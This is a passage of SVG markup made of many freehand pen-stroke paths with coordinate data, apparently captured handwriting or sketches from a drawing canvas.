<path d="M943.22 3543.72 L942.04 3543.66 L940.81 3543.60 L939.18 3544.22 L937.38 3545.41 L936.49 3546.16 L934.80 3547.98 L933.40 3549.98 L932.16 3552.10 L931.26 3554.10 L930.87 3555.10 L930.53 3556.67 L930.37 3557.92 L930.76 3558.79 L932.05 3558.48 L933.23 3557.67 L934.69 3556.17 L935.87 3554.61 L936.43 3553.73 L937.16 3552.60 L937.66 3551.73 L938.23 3550.91 L938.06 3552.04 L937.89 3553.23 L937.89 3554.42 L938.23 3555.48 L939.07 3556.04 L941.14 3555.42 L943.05 3554.23 L944.79 3552.73 L946.42 3551.29 L947.83 3549.91 L948.78 3548.91 L949.45 3548.23 L950.07 3547.72 L950.24 3548.79 L950.13 3549.91 L950.24 3551.04 L950.46 3553.66 L950.52 3554.73 L950.69 3556.54 L950.91 3557.98 L951.25 3559.17 L951.25 3559.17" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M962.53 3550.60 L961.41 3550.98 L960.40 3551.54 L959.73 3552.23 L959.28 3552.91 L959.33 3554.04 L960.46 3554.29 L961.69 3553.98 L962.59 3553.54 L963.32 3552.91 L963.88 3552.23 L964.33 3551.54 L964.84 3550.91 L965.00 3551.85 L965.00 3554.61 L964.95 3555.85 L964.61 3560.04 L964.33 3562.67 L963.94 3565.17 L963.49 3567.49 L963.10 3569.42 L962.76 3570.80 L962.42 3571.86 L961.97 3572.86 L960.40 3571.49 L959.73 3569.42 L959.50 3568.49 L959.33 3566.67 L959.45 3565.23 L959.73 3564.11 L960.23 3563.17 L961.64 3561.92 L962.31 3561.42 L963.66 3560.79 L966.07 3560.04 L967.14 3559.79 L970.28 3559.04 L972.30 3558.42 L973.14 3558.11 L974.83 3557.48 L976.18 3556.61 L977.13 3555.85 L977.86 3554.98 L978.20 3554.04 L978.31 3552.73 L977.92 3551.48 L977.36 3550.66 L976.63 3550.29 L975.50 3550.60 L974.66 3551.54 L973.54 3553.10 L972.75 3554.98 L972.47 3555.92 L972.25 3557.67 L972.30 3559.36 L972.70 3561.04 L973.54 3562.86 L975.50 3564.98 L976.18 3565.42 L977.58 3565.92 L977.58 3565.92" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M991.39 3548.60 L990.66 3549.29 L990.21 3550.54 L989.54 3552.60 L988.86 3554.79 L988.47 3555.85 L987.85 3557.98 L987.29 3559.79 L986.79 3561.23 L986.79 3561.23" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M980.95 3556.42 L982.18 3556.54 L983.36 3556.92 L985.83 3557.92 L988.86 3559.42 L988.86 3559.42" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M892.47 3820.53 L892.02 3824.85 L891.80 3827.16 L891.29 3832.98 L890.67 3839.17 L890.00 3845.67 L888.93 3852.73 L887.64 3860.36 L886.30 3868.12 L884.95 3875.68 L883.43 3883.06 L882.09 3889.63 L880.79 3895.50 L879.56 3900.88 L878.60 3905.26 L877.76 3909.07 L877.14 3912.13 L876.70 3914.57 L876.47 3915.57 L876.19 3917.14 L875.97 3918.26 L875.80 3919.58 L876.13 3920.39 L876.86 3920.76 L879.56 3920.95 L881.07 3920.83 L884.44 3920.64 L888.65 3920.26 L893.37 3919.83 L899.04 3919.33 L908.64 3918.64 L915.71 3918.26 L924.19 3917.89 L933.00 3917.64 L937.66 3917.39 L947.26 3917.01 L958.89 3916.70 L968.04 3916.57 L976.91 3916.39 L985.61 3916.20 L994.09 3915.89 L1002.28 3915.45 L1014.13 3914.32 L1017.83 3913.82 L1025.30 3912.76 L1032.54 3911.45 L1039.73 3909.82 L1046.07 3908.20 L1051.57 3906.76 L1056.40 3905.32 L1060.33 3904.13 L1063.76 3902.82 L1065.38 3902.26 L1069.20 3900.44 L1071.28 3899.07 L1073.07 3897.50 L1074.65 3895.75 L1075.99 3893.94 L1077.23 3892.13 L1078.30 3890.31 L1079.08 3888.56 L1079.53 3887.69 L1080.49 3885.69 L1081.21 3883.75 L1082.06 3881.62 L1082.90 3879.37 L1084.02 3875.31 L1084.75 3871.56 L1085.37 3867.18 L1085.76 3862.30 L1085.87 3859.86 L1085.99 3854.92 L1085.82 3850.23 L1085.37 3845.79 L1084.70 3841.73 L1083.63 3838.04 L1082.34 3834.66 L1080.77 3831.60 L1077.68 3827.60 L1076.39 3826.41 L1073.52 3824.29 L1070.44 3822.41 L1066.90 3820.85 L1063.19 3819.53 L1059.43 3818.41 L1055.33 3817.53 L1051.24 3816.84 L1047.03 3816.47 L1044.84 3816.34 L1037.99 3816.34 L1033.38 3816.41 L1028.56 3816.59 L1023.73 3816.97 L1018.34 3817.35 L1012.44 3817.91 L1006.38 3818.53 L1000.04 3819.10 L996.84 3819.41 L990.44 3820.10 L984.15 3820.66 L976.01 3821.16 L971.12 3821.22 L966.35 3821.10 L961.75 3820.85 L957.14 3820.47 L952.54 3820.10 L950.24 3820.03 L945.52 3819.78 L940.81 3819.66 L936.20 3819.47 L931.83 3819.41 L927.78 3819.35 L924.25 3819.28 L919.25 3819.10 L916.11 3818.91 L914.53 3818.78 L911.50 3818.72 L908.47 3818.59 L905.61 3818.41 L902.91 3818.28 L900.56 3818.22 L898.76 3818.09 L897.30 3818.09 L896.29 3818.03 L895.05 3817.91 L895.05 3817.91" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M937.61 3963.16 L937.44 3961.97 L937.55 3960.91 L937.83 3959.78 L938.90 3955.34 L939.97 3951.53 L941.03 3947.46 L942.16 3943.34 L943.00 3939.09 L943.33 3937.02 L943.90 3932.77 L944.01 3928.64 L944.01 3924.45 L943.78 3920.45 L943.50 3917.08 L943.11 3912.51 L943.00 3909.82 L942.83 3907.57 L942.77 3906.51 L942.83 3904.88 L943.00 3903.57 L943.28 3902.51 L943.28 3902.51" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M937.21 3908.26 L938.45 3906.57 L939.18 3905.63 L940.81 3903.51 L942.38 3901.44 L943.95 3899.51 L945.41 3897.88 L946.65 3896.44 L947.26 3895.75 L948.33 3894.75 L949.17 3894.00 L949.90 3893.50 L951.03 3893.19 L952.04 3893.50 L953.78 3895.19 L955.12 3897.07 L956.53 3899.51 L957.31 3900.88 L958.89 3903.82 L960.46 3906.82 L962.14 3910.07 L962.14 3910.07" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M992.01 3957.53 L991.17 3956.97 L991.05 3955.78 L991.17 3952.84 L991.39 3949.09 L991.73 3944.52 L991.95 3939.77 L992.12 3937.27 L992.34 3932.52 L992.68 3926.21 L992.79 3922.64 L992.85 3919.45 L993.02 3916.39 L993.13 3913.64 L993.36 3910.95 L993.52 3908.38 L993.52 3907.19 L993.69 3904.88 L993.75 3902.88 L993.80 3901.38 L993.80 3900.19 L993.80 3898.88 L993.80 3898.88" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M983.59 3910.13 L983.42 3908.95 L985.33 3904.13 L987.07 3900.57 L989.37 3896.82 L991.39 3893.63 L993.47 3890.81 L994.53 3889.56 L996.33 3887.44 L997.96 3885.81 L999.42 3884.44 L1000.49 3883.62 L1001.33 3883.25 L1002.06 3883.62 L1002.51 3884.75 L1002.73 3886.37 L1003.12 3888.81 L1003.52 3891.44 L1003.97 3894.38 L1004.41 3897.76 L1004.41 3897.76" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M906.73 3965.35 L905.78 3965.53 L905.21 3966.47 L904.54 3968.66 L903.98 3970.85 L903.36 3973.04 L903.14 3974.16 L902.69 3975.98 L902.46 3977.42 L902.30 3978.54 L902.30 3979.66 L902.30 3979.66" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M907.35 3962.66 L908.86 3959.59 L909.71 3958.22 L911.56 3955.47 L914.76 3952.15 L917.17 3950.59 L919.53 3949.59 L922.00 3949.22 L923.12 3949.09 L925.37 3949.28 L927.67 3949.65 L929.75 3950.22 L931.71 3950.90 L933.23 3951.53 L934.46 3952.15 L935.36 3952.84 L936.04 3953.59 L936.43 3954.59 L936.99 3956.53 L937.10 3957.59 L937.16 3960.84 L936.93 3963.47 L936.71 3966.10 L936.20 3968.91 L935.87 3971.48 L935.42 3973.98 L935.19 3975.10 L934.69 3977.85 L934.24 3979.23 L933.57 3980.17 L933.57 3980.17" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M899.21 3973.35 L897.69 3973.04 L896.74 3972.72 L907.52 3972.29 L913.30 3972.72 L916.33 3972.97 L922.39 3973.60 L925.31 3973.79 L925.31 3973.79" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M983.59 3949.90 L982.58 3950.28 L981.62 3951.28 L980.33 3952.97 L979.26 3954.84 L978.42 3956.97 L977.75 3959.09 L977.30 3961.28 L977.13 3962.28 L976.85 3963.91 L976.63 3965.35 L976.40 3966.66 L976.18 3967.60 L975.90 3968.72 L976.46 3967.47 L977.58 3964.85 L979.04 3961.66 L980.56 3958.47 L982.69 3954.47 L984.04 3952.28 L985.38 3950.53 L986.90 3948.90 L987.74 3948.22 L989.59 3947.09 L991.73 3946.21 L994.20 3945.65 L996.84 3945.46 L999.64 3945.59 L1002.51 3945.96 L1005.20 3946.59 L1007.61 3947.40 L1009.69 3948.53 L1011.26 3949.90 L1012.16 3951.65 L1012.39 3952.53 L1012.33 3955.72 L1011.66 3958.28 L1010.76 3961.03 L1009.69 3964.16 L1008.46 3967.41 L1007.78 3968.97 L1006.60 3972.10 L1005.43 3974.85 L1004.02 3978.35 L1003.12 3980.04 L1002.23 3981.10 L1002.23 3981.10" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M993.07 3970.16 L992.34 3969.41 L991.78 3968.72 L992.79 3968.47 L994.65 3968.35 L997.96 3968.22 L1002.28 3967.85 L1004.41 3967.72 L1004.41 3967.72" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M974.72 3785.89 L974.44 3786.89 L974.44 3788.33 L974.89 3791.39 L975.33 3794.08 L976.01 3798.21 L976.23 3799.65 L976.63 3802.59 L976.85 3805.53 L976.91 3808.40 L976.91 3811.09 L976.91 3812.22 L976.91 3814.16 L976.91 3814.16" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M973.14 3785.39 L974.66 3783.64 L976.63 3782.14 L978.59 3780.95 L980.72 3780.20 L982.97 3780.02 L985.38 3780.33 L987.63 3781.14 L988.70 3781.77 L988.70 3781.77" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M997.85 3796.52 L996.72 3796.33 L995.32 3796.33 L993.97 3796.46 L992.12 3797.33 L990.27 3798.46 L988.75 3799.90 L987.52 3801.46 L986.96 3802.28 L986.11 3803.84 L985.66 3805.15 L985.44 3806.22 L985.44 3807.34 L986.00 3807.97 L987.07 3808.03 L988.70 3807.09 L989.99 3805.96 L990.89 3804.90 L991.56 3804.03 L992.01 3803.34 L992.63 3802.59 L993.07 3803.40 L993.30 3804.46 L993.69 3805.40 L994.42 3806.03 L995.54 3806.15 L996.84 3805.65 L998.58 3804.65 L1000.15 3803.28 L1001.55 3801.59 L1002.56 3799.90 L1003.63 3797.33 L1003.85 3796.40 L1003.85 3795.15 L1003.52 3794.33 L1003.24 3795.27 L1003.40 3796.27 L1003.85 3798.59 L1004.19 3800.71 L1004.47 3802.46 L1005.14 3805.28 L1005.43 3806.15 L1005.93 3807.59 L1006.44 3808.78 L1007.05 3809.59 L1007.05 3809.59" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1020.25 3798.96 L1019.57 3798.52 L1018.73 3798.21 L1017.38 3798.15 L1016.15 3798.33 L1014.35 3799.21 L1013.62 3799.59 L1012.56 3800.33 L1011.77 3801.03 L1011.26 3801.71 L1010.98 3802.52 L1011.43 3803.28 L1012.61 3803.28 L1013.62 3802.90 L1015.70 3801.52 L1016.71 3800.52 L1017.44 3799.71 L1018.06 3799.02 L1018.67 3798.21 L1019.18 3797.52 L1019.85 3798.27 L1020.47 3801.46 L1020.75 3803.96 L1020.86 3805.28 L1021.09 3807.84 L1021.14 3810.41 L1021.09 3811.59 L1020.98 3813.47 L1020.92 3814.97 L1020.70 3816.16 L1020.53 3817.16 L1020.19 3818.09 L1019.40 3818.53 L1018.96 3817.84 L1018.73 3816.84 L1018.90 3815.72 L1019.57 3814.59 L1020.64 3813.09 L1021.87 3811.72 L1022.49 3811.15 L1023.84 3810.22 L1025.36 3809.22 L1026.59 3808.46 L1028.67 3807.03 L1029.90 3806.03 L1029.90 3806.03" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1033.83 3800.40 L1034.00 3799.28 L1033.89 3798.15 L1033.78 3796.77 L1033.44 3795.77 L1032.71 3795.21 L1031.64 3795.58 L1031.03 3796.33 L1030.52 3798.52 L1030.35 3800.28 L1030.58 3801.77 L1031.19 3803.28 L1032.26 3804.84 L1032.93 3805.53 L1034.34 3806.59 L1035.69 3807.09 L1035.69 3807.09" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1055.50 3792.71 L1054.72 3793.15 L1054.04 3794.08 L1053.59 3794.77 L1053.14 3796.09 L1052.47 3797.90 L1052.02 3799.33 L1051.69 3800.71 L1051.46 3801.90 L1051.24 3802.90 L1051.01 3804.28 L1051.01 3804.28" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1047.92 3804.46 L1048.26 3803.59 L1049.05 3803.09 L1050.06 3802.90 L1051.40 3802.71 L1053.59 3802.90 L1054.72 3803.09 L1054.72 3803.09" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1072.68 3812.40 L1072.68 3812.41" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M973.31 3784.45 L973.82 3783.89 L975.56 3783.45 L975.56 3783.45" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M330.17 4430.70 L329.16 4430.07 L327.98 4429.51 L326.02 4428.76 L323.71 4428.01 L321.02 4427.26 L319.50 4426.95 L316.42 4426.38 L312.82 4425.82 L309.34 4425.32 L305.86 4425.07 L302.60 4424.76 L297.83 4424.51 L294.74 4424.70 L291.66 4425.14 L290.03 4425.51 L286.66 4426.45 L283.52 4427.70 L280.49 4429.20 L277.62 4431.01 L274.98 4432.95 L272.63 4435.39 L270.60 4437.89 L268.53 4441.58 L268.02 4442.77 L267.29 4445.39 L267.07 4448.08 L267.24 4450.71 L267.97 4453.34 L269.31 4455.96 L271.39 4458.58 L274.09 4461.09 L277.62 4463.65 L281.78 4466.03 L284.13 4467.15 L291.83 4470.09 L297.50 4471.65 L303.39 4472.97 L309.40 4473.97 L315.52 4474.78 L321.69 4475.28 L328.04 4475.41 L334.44 4475.34 L337.64 4475.22 L343.98 4474.84 L350.21 4474.34 L359.31 4473.47 L364.92 4472.78 L369.97 4472.09 L374.74 4471.41 L379.29 4470.78 L383.78 4470.09 L385.97 4469.71 L390.52 4469.15 L395.18 4468.59 L400.40 4468.03 L406.07 4467.34 L412.08 4466.78 L418.20 4466.09 L427.12 4465.15 L432.85 4464.59 L435.26 4464.34 L440.09 4463.84 L444.70 4463.21 L449.13 4462.59 L453.23 4461.84 L457.22 4460.96 L460.98 4460.02 L464.57 4458.96 L467.77 4457.96 L470.58 4456.96 L473.05 4456.02 L475.40 4455.15 L477.59 4454.21 L479.50 4453.27 L481.36 4452.21 L483.10 4451.08 L484.84 4449.96 L486.35 4448.83 L487.64 4447.64 L488.60 4446.64 L489.38 4445.77 L490.28 4444.21 L490.45 4443.02 L490.11 4441.77 L489.05 4439.89 L487.19 4437.89 L485.90 4436.83 L482.87 4434.64 L478.94 4432.39 L474.56 4430.26 L469.85 4428.38 L464.57 4426.76 L455.70 4424.95 L449.30 4424.19 L442.56 4423.76 L439.19 4423.63 L432.23 4423.32 L425.33 4423.26 L418.20 4423.07 L411.12 4422.76 L404.27 4422.38 L397.71 4421.88 L391.36 4421.32 L382.21 4420.57 L379.29 4420.32 L373.57 4419.94 L368.12 4419.57 L362.96 4419.32 L357.79 4419.07 L352.57 4419.07 L347.29 4419.07 L341.40 4419.32 L335.90 4419.63 L330.00 4420.13 L327.14 4420.51 L318.77 4421.95 L313.38 4423.26 L308.22 4424.82 L308.22 4424.82" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M596.16 4420.88 L595.94 4420.01 L595.54 4419.25 L594.65 4423.76 L594.25 4426.89 L593.86 4430.01 L593.52 4433.26 L593.19 4436.51 L593.07 4439.70 L592.74 4442.70 L592.51 4445.45 L592.29 4447.96 L592.23 4449.02 L592.06 4450.52 L592.01 4451.77 L591.90 4452.90 L591.67 4451.83 L591.56 4449.08 L591.39 4445.89 L591.39 4442.64 L591.56 4439.70 L591.78 4436.95 L591.90 4435.83 L592.06 4434.83 L592.51 4433.26 L593.75 4431.32 L594.48 4430.70 L595.32 4430.32 L597.29 4429.82 L598.80 4429.64 L600.20 4429.51 L601.55 4429.32 L602.73 4429.26 L603.74 4429.20 L604.75 4429.07 L605.65 4428.82 L608.46 4427.38 L609.07 4426.89 L609.86 4425.82 L610.48 4424.76 L610.87 4423.82 L611.26 4422.76 L611.49 4421.88 L610.48 4423.82 L609.75 4426.19 L609.07 4428.89 L608.46 4431.76 L607.90 4434.64 L607.62 4437.58 L607.33 4440.33 L607.22 4441.70 L607.00 4444.33 L606.94 4445.45 L606.89 4447.39 L606.94 4448.89 L606.94 4448.89" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M618.62 4441.51 L618.39 4440.26 L618.11 4439.39 L617.50 4438.70 L616.43 4438.76 L615.14 4440.08 L614.58 4440.70 L613.45 4442.39 L612.61 4444.21 L611.83 4446.77 L611.71 4448.21 L611.77 4449.33 L612.05 4450.21 L612.44 4451.02 L613.17 4451.77 L614.35 4451.96 L615.25 4451.77 L616.43 4450.77 L617.44 4449.33 L618.11 4448.08 L618.73 4447.02 L619.07 4446.08 L619.52 4445.21 L619.91 4444.27 L620.47 4445.02 L620.58 4446.02 L620.81 4447.14 L621.14 4448.27 L621.48 4449.33 L621.93 4450.21 L622.66 4450.83 L623.39 4450.46 L624.79 4448.52 L625.58 4447.39 L626.20 4446.45 L626.65 4445.77 L627.15 4445.02 L627.71 4444.33 L628.22 4445.21 L628.27 4446.39 L628.44 4447.58 L628.50 4448.71 L628.67 4449.77 L628.84 4450.77 L629.06 4451.77 L630.13 4451.64 L631.25 4450.21 L631.70 4449.39 L632.20 4448.58 L632.99 4447.21 L633.55 4446.14 L634.00 4445.33 L634.56 4444.45 L635.07 4443.77 L635.91 4444.08 L636.42 4444.96 L636.92 4445.89 L637.26 4447.02 L637.26 4447.02" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M653.48 4444.58 L653.14 4443.83 L652.36 4442.64 L651.63 4441.77 L650.79 4441.20 L649.89 4440.95 L648.65 4441.14 L646.69 4442.39 L645.29 4443.83 L644.16 4445.45 L643.54 4446.39 L642.70 4448.33 L642.20 4450.33 L641.97 4451.96 L641.97 4453.34 L642.25 4454.46 L642.65 4455.40 L643.21 4455.96 L644.44 4456.02 L646.86 4455.15 L649.55 4452.71 L651.01 4450.90 L651.01 4450.90" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M662.86 4423.26 L663.14 4422.26 L663.53 4420.69 L663.76 4419.57 L663.76 4418.38 L663.08 4418.88 L662.35 4420.88 L662.02 4422.01 L661.51 4424.51 L660.95 4427.26 L660.22 4431.89 L659.77 4435.14 L659.32 4438.39 L658.93 4441.51 L658.65 4444.58 L658.42 4447.45 L658.20 4449.96 L658.09 4451.02 L658.03 4452.52 L658.03 4452.52" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M663.81 4454.21 L665.50 4451.96 L667.29 4449.02 L669.09 4445.96 L670.77 4442.64 L672.23 4439.20 L673.47 4436.08 L674.31 4433.32 L674.98 4430.82 L675.43 4428.89 L675.77 4427.38 L675.88 4426.19 L675.83 4424.88 L675.43 4424.07 L674.65 4423.76 L672.91 4425.51 L671.62 4427.63 L670.27 4430.70 L669.03 4434.20 L668.42 4435.95 L667.01 4441.58 L666.34 4445.21 L665.89 4448.27 L665.72 4451.21 L665.72 4453.71 L665.78 4454.77 L666.17 4456.40 L666.79 4457.52 L667.46 4458.34 L668.64 4458.52 L670.10 4458.09 L671.00 4457.52 L673.69 4455.52 L675.38 4453.77 L676.95 4451.90 L678.30 4449.83 L679.47 4447.96 L680.26 4446.33 L680.82 4445.02 L681.10 4444.14 L681.44 4443.08 L681.10 4442.14 L680.26 4442.45 L679.70 4443.33 L678.86 4445.33 L678.58 4446.27 L678.07 4447.83 L677.79 4449.27 L677.57 4450.46 L677.51 4451.52 L677.51 4452.90 L677.73 4453.96 L678.07 4454.71 L678.91 4455.08 L680.20 4454.77 L681.33 4454.15 L682.17 4453.65 L682.79 4453.08 L683.91 4452.27 L685.43 4450.83 L686.10 4450.02 L686.60 4449.27 L687.00 4448.52 L687.28 4449.39 L687.62 4450.52 L688.01 4451.52 L688.96 4453.65 L689.41 4454.52 L690.09 4455.96 L690.70 4457.15 L691.21 4458.15 L691.77 4458.96 L692.33 4459.96 L692.95 4460.71 L692.95 4460.71" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M719.90 4456.52 L721.36 4455.15 L722.09 4454.21 L723.99 4451.96 L725.79 4449.27 L727.53 4446.08 L729.05 4442.52 L730.23 4438.76 L731.12 4435.08 L731.80 4431.89 L732.19 4429.32 L732.30 4427.45 L732.13 4426.07 L731.74 4425.26 L730.84 4424.76 L729.72 4425.07 L728.26 4426.38 L726.97 4428.26 L725.79 4430.76 L724.78 4433.64 L724.05 4436.58 L723.54 4439.58 L723.32 4441.02 L723.10 4443.89 L722.98 4446.71 L723.15 4450.21 L723.43 4452.39 L723.77 4454.02 L724.05 4455.27 L724.50 4456.34 L725.00 4456.96 L726.02 4457.34 L726.02 4457.34" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M737.36 4447.64 L736.91 4446.83 L735.84 4446.71 L733.48 4447.96 L731.91 4449.46 L730.56 4451.39 L729.50 4453.34 L728.65 4455.40 L728.37 4456.27 L728.20 4457.84 L728.37 4459.15 L728.65 4460.02 L729.16 4460.71 L730.00 4461.09 L731.12 4460.65 L732.58 4459.52 L733.76 4458.02 L734.77 4456.52 L735.45 4455.27 L735.95 4454.39 L736.34 4453.65 L736.79 4452.71 L737.13 4451.90 L737.24 4452.90 L737.47 4454.02 L737.80 4454.96 L738.25 4455.96 L738.76 4456.77 L738.76 4456.77" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M741.12 4437.39 L740.78 4436.39 L740.89 4435.32 L742.74 4435.95 L744.65 4437.26 L746.62 4438.95 L748.64 4440.83 L748.64 4440.83" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M769.19 4444.83 L768.79 4444.08 L768.12 4443.21 L767.28 4442.77 L766.16 4442.77 L764.25 4444.45 L763.07 4446.02 L761.94 4447.83 L761.50 4448.83 L760.82 4450.71 L760.60 4451.58 L760.26 4453.08 L760.26 4454.39 L760.60 4455.52 L761.10 4456.27 L763.24 4457.27 L764.98 4457.40 L767.00 4457.15 L767.00 4457.15" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M777.33 4452.71 L777.83 4452.02 L778.23 4451.02 L778.06 4450.02 L777.38 4449.33 L775.14 4450.15 L773.57 4451.46 L772.95 4452.27 L771.83 4454.02 L770.98 4455.83 L770.59 4456.65 L770.37 4458.15 L770.48 4459.34 L770.70 4460.34 L771.15 4461.02 L772.11 4461.65 L773.23 4461.65 L774.52 4461.15 L775.36 4460.65 L776.93 4459.34 L778.23 4457.71 L779.35 4455.96 L780.25 4454.39 L780.86 4453.34 L781.31 4452.52 L781.71 4451.58 L782.10 4450.77 L781.87 4451.64 L781.76 4452.96 L781.87 4454.08 L782.10 4455.15 L782.44 4456.02 L783.05 4456.65 L783.95 4456.90 L784.96 4456.40 L785.64 4455.96 L786.37 4455.40 L787.04 4454.90 L787.21 4455.90 L787.38 4457.09 L787.49 4458.09 L787.71 4458.96 L788.11 4459.84 L788.11 4459.84" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M804.72 4426.95 L804.11 4427.51 L803.15 4429.32 L802.25 4431.70 L801.52 4434.32 L801.07 4437.20 L801.07 4437.20" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M823.53 4451.96 L823.03 4451.08 L822.46 4450.46 L821.45 4450.02 L820.16 4450.15 L819.38 4450.71 L818.70 4451.39 L818.20 4452.15 L818.53 4453.08 L819.66 4453.08 L820.56 4452.64 L822.13 4451.52 L823.53 4450.15 L824.49 4448.71 L825.16 4447.58 L825.61 4446.77 L826.17 4445.77 L826.51 4445.02 L826.67 4446.02 L826.84 4447.02 L827.12 4448.58 L827.40 4450.83 L827.74 4453.21 L828.02 4455.46 L828.13 4456.52 L828.25 4458.34 L828.36 4459.96 L828.36 4461.34 L828.25 4462.52 L828.19 4463.65 L827.40 4466.21 L826.67 4467.90 L826.23 4468.59 L825.55 4469.53 L824.77 4470.15 L823.98 4470.53 L823.42 4469.90 L824.09 4468.03 L824.54 4467.15 L826.45 4464.21 L827.18 4463.21 L828.70 4461.34 L830.32 4459.46 L831.78 4457.71 L833.30 4456.15 L834.65 4454.52 L835.94 4453.21 L836.56 4452.52 L837.45 4451.52 L838.07 4450.71 L838.74 4449.83 L839.25 4449.08 L839.14 4450.15 L838.80 4451.15 L838.58 4452.33 L838.46 4453.46 L838.46 4453.46" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M842.90 4431.82 L842.62 4430.76 L842.51 4429.70 L843.63 4429.64 L846.38 4430.38 L848.57 4431.20 L850.82 4432.39 L852.78 4433.57 L852.78 4433.57" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M872.99 4424.32 L872.09 4424.51 L872.04 4423.44 L872.54 4422.88 L873.16 4422.26 L874.11 4422.51 L874.67 4423.13 L874.96 4424.19 L875.40 4426.32 L875.52 4428.26 L875.35 4429.89 L874.73 4432.82 L874.11 4434.76 L873.66 4435.76 L872.32 4438.26 L871.47 4439.45 L870.91 4440.45 L870.35 4441.14 L869.79 4441.89 L869.79 4441.89" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M867.94 4451.64 L867.43 4452.27 L866.65 4452.64 L866.65 4452.64" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
